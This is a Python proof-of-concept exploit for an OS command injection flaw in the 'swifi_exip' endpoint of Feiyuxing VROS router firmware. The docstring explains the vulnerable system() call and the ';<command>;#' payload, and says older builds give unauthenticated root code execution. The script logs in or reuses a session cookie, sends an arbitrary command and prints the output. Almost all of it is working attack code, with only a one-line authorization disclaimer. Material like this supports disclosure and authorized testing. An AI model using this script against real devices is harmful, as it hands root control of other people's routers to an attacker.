#!/usr/bin/env python3
"""OS command injection PoC for swifi_exip (Feiyuxing VROS web CGI).

Only use on your own or explicitly authorized device.

Sink (webserver, sub_4A2C4C):
    POST /send_order.cgi?parameter=swifi_exip
    {"opera":"add","exip":";<command>;#"}

    snprintf(cmd, 1024, "/usr/sbin/swifi.sh add_ip_expt %s >/dev/null 2>&1 ",
             exip);
    system(cmd);                      /* "del" path is equivalent */

The injected command runs as root. The trailing "#" comments out the
original redirection, so command output lands in the HTTP response body.

Reachability:
  * firmware B-MB3W202-210825-r11775: /send_order.cgi is gated by a
    session cookie (no cookie => redirect to login.html);
  * earlier firmware builds lack that gate for this parameter, making it
    an unauthenticated root RCE (verified on a live device).

Auth modes:
  * no -p/--cookie : send the request unauthenticated (older builds);
  * -p <password>  : log in first via ?parameter=login and reuse the
                     returned hash_key/session_id session cookie;
  * --cookie ...   : reuse an existing session (e.g. from a browser).

Note: after 5 failed logins the web UI locks login for ~5 minutes.
"""
import argparse
import json
import re
import socket
import sys

ENDPOINT = "swifi_exip"
LOGIN_ENDPOINT = "login"
EVIDENCE = "/usr/sbin/swifi.sh add_ip_expt %s >/dev/null 2>&1  |  del_ip_expt %s"
COOKIE_RE = re.compile(rb"hash_key=([^,\s;]+),session_id=([^;\s]+)")


def build_request(ip, port, endpoint, body, host_header, cookie):
    host = host_header or f"{ip}:{port}"
    headers = [
        f"POST /send_order.cgi?parameter={endpoint} HTTP/1.1",
        f"Host: {host}",
        "Accept-Language: zh-CN,zh;q=0.9",
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding: identity",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
        "X-Requested-With: XMLHttpRequest",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    if cookie:
        headers.append(f"Cookie: {cookie}")
    return ("\r\n".join(headers) + "\r\n\r\n").encode() + body


def http_exchange(ip, port, endpoint, body, host_header, cookie, timeout, show_request):
    request = build_request(ip, port, endpoint, body, host_header, cookie)
    if show_request:
        print("[*] raw request:")
        print(request.decode("utf-8", "replace"))
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.sendall(request)
            sock.shutdown(socket.SHUT_WR)
            chunks = []
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
    except OSError as exc:
        print(f"[!] socket error: {exc}")
        sys.exit(1)
    return b"".join(chunks)


p = argparse.ArgumentParser(description="authorized PoC")
p.add_argument("ip")
p.add_argument("port", type=int)
p.add_argument("-c", "--command", default="id", help="command to execute (default: id)")
p.add_argument("-u", "--username", default="admin", help="web admin user (default: admin)")
p.add_argument("-p", "--password", help="web admin password (login step)")
p.add_argument("--cookie", help="existing session cookie 'hash_key=..,session_id=..' (skips login)")
p.add_argument("--host-header")
p.add_argument("--timeout", type=int, default=10)
p.add_argument("--show-request", action="store_true")
a = p.parse_args()

cookie = a.cookie
if not cookie and a.password:
    login_body = json.dumps({"username": a.username, "password": a.password}, separators=(",", ":")).encode()
    print(f"[*] login as {a.username!r} ...")
    resp = http_exchange(a.ip, a.port, LOGIN_ENDPOINT, login_body, a.host_header, None, a.timeout, a.show_request)
    m = COOKIE_RE.search(resp)
    if not m:
        print("[!] login failed (or no Set-Cookie), raw response:")
        print(resp.decode("utf-8", "replace"))
        sys.exit(1)
    cookie = f"hash_key={m.group(1).decode()},session_id={m.group(2).decode()}"
    print(f"[+] login ok, session: {cookie}")

if not cookie:
    print("[i] no -p/--password and no --cookie: sending request unauthenticated")

body = json.dumps({"opera": "add", "exip": f";{a.command};#"}, separators=(",", ":")).encode()

print(f"[*] endpoint: {ENDPOINT}")
print(f"[*] body: {body.decode()}")
print(f"[*] evidence: {EVIDENCE}")

response = http_exchange(a.ip, a.port, ENDPOINT, body, a.host_header, cookie, a.timeout, a.show_request)
print(f"[*] response size: {len(response)} bytes")
print("[*] raw response:")
print(response.decode("utf-8", "replace"))
